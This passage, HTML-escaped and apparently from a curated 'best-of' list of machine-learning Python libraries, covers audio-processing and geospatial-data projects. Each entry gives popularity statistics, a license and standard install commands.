· 📦 130 · 📋 120 - 24% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/iver56/audiomentations&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/audiomentations&#34;&gt;PyPi&lt;/a&gt; (📥 4.5K / month · 📦 1 · ⏱️ 18.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install audiomentations&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/CPJKU/madmom&#34;&gt;Madmom&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 900) - Python audio and music signal processing library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/CPJKU/madmom&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 20 · 🔀 150 · 📦 200 · 📋 260 - 21% open · ⏱️ 06.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/CPJKU/madmom&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/madmom&#34;&gt;PyPi&lt;/a&gt; (📥 2.7K / month · 📦 27 · ⏱️ 14.11.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install madmom&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/bastibe/python-soundfile&#34;&gt;python-soundfile&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 450) - SoundFile is an audio library based on libsndfile, CFFI, and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/bastibe/python-soundfile&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 24 · 🔀 68 · 📥 3.2K · 📋 170 - 39% open · ⏱️ 23.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/bastibe/python-soundfile&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/soundfile&#34;&gt;PyPi&lt;/a&gt; (📥 1M / month · 📦 540 · ⏱️ 27.11.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install soundfile&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/anaconda/pysoundfile&#34;&gt;Conda&lt;/a&gt;:&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c anaconda pysoundfile&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/keunwoochoi/kapre&#34;&gt;kapre&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 820) - kapre: Keras Audio Preprocessors. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/keunwoochoi/kapre&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 140 · 📥 22 · 📦 1.6K · 📋 94 - 12% open · ⏱️ 21.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/keunwoochoi/kapre&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/kapre&#34;&gt;PyPi&lt;/a&gt; (📥 3.7K / month · 📦 14 · ⏱️ 21.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install kapre&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/KinWaiCheuk/nnAudio&#34;&gt;nnAudio&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 680) - Audio processing by using pytorch 1D convolution network. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/KinWaiCheuk/nnAudio&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 66 · 📦 53 · 📋 49 - 24% open · ⏱️ 24.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/KinWaiCheuk/nnAudio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nnAudio&#34;&gt;PyPi&lt;/a&gt; (📥 25K / month · 📦 1 · ⏱️ 24.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nnAudio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 8 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/aubio/aubio&#34;&gt;aubio&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 2.7K) - a library for audio and music analysis. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/MTG/essentia&#34;&gt;Essentia&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 2.1K) - C++ library for audio and music analysis, description and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3pwmjO5&#34;&gt;❗️AGPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jameslyons/python_speech_features&#34;&gt;python_speech_features&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 2.1K · 💀) - This library provides common speech features for ASR.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mozilla/TTS&#34;&gt;TTS&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 6K · 💀) - Deep learning for Text to Speech (Discussion forum:.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3postzC&#34;&gt;MPL-2.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/worldveil/dejavu&#34;&gt;Dejavu&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 5.7K · 💀) - Audio fingerprinting and recognition in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Parisson/TimeSide&#34;&gt;TimeSide&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 320) - Scalable audio processing framework written in Python with a.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3pwmjO5&#34;&gt;❗️AGPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/bmcfee/muda&#34;&gt;Muda&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 210 · 💤) - A library for augmenting annotated audio data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3hkKRql&#34;&gt;ISC&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/adefossez/julius&#34;&gt;Julius&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 270) - Fast PyTorch based DSP for audio and 1D signals. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Geospatial Data&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries to load, process, analyze, and write geographic data as well as libraries for spatial analysis, map visualization, and geocoding.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/visgl/deck.gl&#34;&gt;pydeck&lt;/a&gt;&lt;/b&gt; (🥇42 · ⭐ 9.8K) - WebGL2 powered visualization framework. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/visgl/deck.gl&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 200 · 🔀 1.8K · 📦 4.1K · 📋 2.4K - 6% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/visgl/deck.gl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pydeck&#34;&gt;PyPi&lt;/a&gt; (📥 970K / month · 📦 23 · ⏱️ 25.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pydeck&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pydeck&#34;&gt;Conda&lt;/a&gt; (📥 110K · ⏱️ 26.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pydeck&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.npmjs.com/package/deck.gl&#34;&gt;npm&lt;/a&gt; (📥 310K / month · 📦 380 · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; npm install deck.gl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/shapely/shapely&#34;&gt;Shapely&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 2.8K) - Manipulation and analysis of geometric objects. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/shapely/shapely&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 130 · 🔀 460 · 📥 40 · 📦 30K · 📋 880 - 18% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/shapely/shapely&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/shapely&#34;&gt;PyPi&lt;/a&gt; (📥 6.8M / month · 📦 3.8K · ⏱️ 03.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install shapely&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/shapely&#34;&gt;Conda&lt;/a&gt; (📥 3.7M · ⏱️ 05.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge shapely&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rasterio/rasterio&#34;&gt;Rasterio&lt;/a&gt;&lt;/b&gt; (🥇36 · ⭐ 1.7K) - Rasterio reads and writes geospatial raster datasets. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rasterio/rasterio&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 130 · 🔀 470 · 📥 760 · 📦 4.9K · 📋 1.5K - 9% open · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rasterio/rasterio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/rasterio&#34;&gt;PyPi&lt;/a&gt; (📥 740K / month · 📦 780 · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install rasterio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/rasterio&#34;&gt;Conda&lt;/a&gt; (📥 1.5M · ⏱️ 11.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge rasterio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/python-visualization/folium&#34;&gt;folium&lt;/a&gt;&lt;/b&gt; (🥈35 · ⭐ 5.8K) - Python Data. Leaflet.js Maps. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/python-visualization/folium&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 130 · 🔀 2.1K · 📦 16K · 📋 950 - 23% open · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/python-visualization/folium&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/folium&#34;&gt;PyPi&lt;/a&gt; (📥 960K / month · 📦 660 · ⏱️ 19.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install folium&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/folium&#34;&gt;Conda&lt;/a&gt; (📥 780K · ⏱️ 03.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge folium&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/geopandas/geopandas&#34;&gt;GeoPandas&lt;/a&gt;&lt;/b&gt; (🥈35 · ⭐ 3.2K) - Python tools for geographic data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/geopandas/geopandas&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 170 · 🔀 720 · 📥 1.5K · 📦 14K · 📋 1.3K - 30% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/geopandas/geopandas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/geopandas&#34;&gt;PyPi&lt;/a&gt; (📥 2.3M / month · 📦 1.1K · ⏱️ 16.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install geopandas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/geopandas&#34;&gt;Conda&lt;/a&gt; (📥 1.6M · ⏱️ 01.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge geopandas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pyproj4/pyproj&#34;&gt;pyproj&lt;/a&gt;&lt;/b&gt; (🥈35 · ⭐ 760) - Python interface to PROJ (cartographic projections and coordinate.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pyproj4/pyproj&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 49 · 🔀 180 · 📦 14K · 📋 490 - 2% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pyproj4/pyproj&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyproj&#34;&gt;PyPi&lt;/a&gt; (📥 4.5M / month · 📦 1.7K · ⏱️ 22.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyproj&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pyproj&#34;&gt;Conda&lt;/a&gt; (📥 3.4M · ⏱️ 24.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pyproj&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/geopy/geopy&#34;&gt;geopy&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 3.6K) - Geocoding library for Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/geopy/geopy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 130 · 🔀 570 · 📦 38K · 📋 260 - 10% open · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/geopy/geopy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/geopy&#34;&gt;PyPi&lt;/a&gt; (📥 3.6M / month · 📦 3.9K · ⏱️ 11.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install geopy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/geopy&#34;&gt;Conda&lt;/a&gt; (📥 710K · ⏱️ 12.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge geopy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jupyter-widgets/ipyleaflet&#34;&gt;ipyleaflet&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 1.3K) - A Jupyter - Leaflet.js bridge. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jupyter-widgets/ipyleaflet&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 78 · 🔀 330 · 📦 1.8K · 📋 490 - 38% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jupyter-widgets/ipyleaflet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ipyleaflet&#34;&gt;PyPi&lt;/a&gt; (📥 72K / month · 📦 110 · ⏱️ 14.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ipyleaflet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ipyleaflet&#34;&gt;Conda&lt;/a&gt; (📥 820K · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ipyleaflet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.npmjs.com/package/jupyter-leaflet&#34;&gt;npm&lt;/a&gt; (📥 51K / month · 📦 2 · ⏱️ 14.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; npm install jupyter-leaflet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Toblerity/Fiona&#34;&gt;Fiona&lt;/a&gt;&lt;/b&gt; (🥉32 · ⭐ 920) - Fiona reads and writes geographic data files. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Toblerity/Fiona&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 66 · 🔀 180 · 📦 8.6K · 📋 680 - 11% open · ⏱️ 01.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Toblerity/Fiona&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/fiona&#34;&gt;PyPi&lt;/a&gt; (📥 2.6M / month · 📦 780 · ⏱️ 07.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install fiona&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/fiona&#34;&gt;Conda&lt;/a&gt; (📥 2.9M · ⏱️ 26.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge fiona&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Esri/arcgis-python-api&#34;&gt;ArcGIS API&lt;/a&gt;&lt;/b&gt; (🥉31 · ⭐ 1.3K) - Documentation and samples for ArcGIS API for Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Esri/arcgis-python-api&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 80 · 🔀 880 · 📥 3.4K · 📋 520 - 23% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Esri/arcgis-python-api&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/arcgis&#34;&gt;PyPi&lt;/a&gt; (📥 75K / month · 📦 22 · ⏱️ 03.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install arcgis&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/esridocker/arcgis-api-python-notebook&#34;&gt;Docker Hub&lt;/a&gt; (📥 7K · ⭐ 33 · ⏱️ 04.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull esridocker/arcgis-api-python-notebook&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jazzband/geojson&#34;&gt;geojson&lt;/a&gt;&lt;/b&gt; (🥉29 · ⭐ 720) - Python bindings and utilities for GeoJSON. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jazzband/geojson&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 48 · 🔀 95 · 📦 9.3K · 📋 84 - 26% open · ⏱️ 07.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jazzband/geojson&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/geojson&#34;&gt;PyPi&lt;/a&gt; (📥 740K / month · 📦 1.1K · ⏱️ 09.08.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install geojson&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/geojson&#34;&gt;Conda&lt;/a&gt; (📥 510K · ⏱️ 11.08.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge geojson&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pysal/pysal&#34;&gt;PySAL&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 1K) - PySAL: Python Spatial Analysis Library Meta-Package. &lt;code&gt;&lt;a 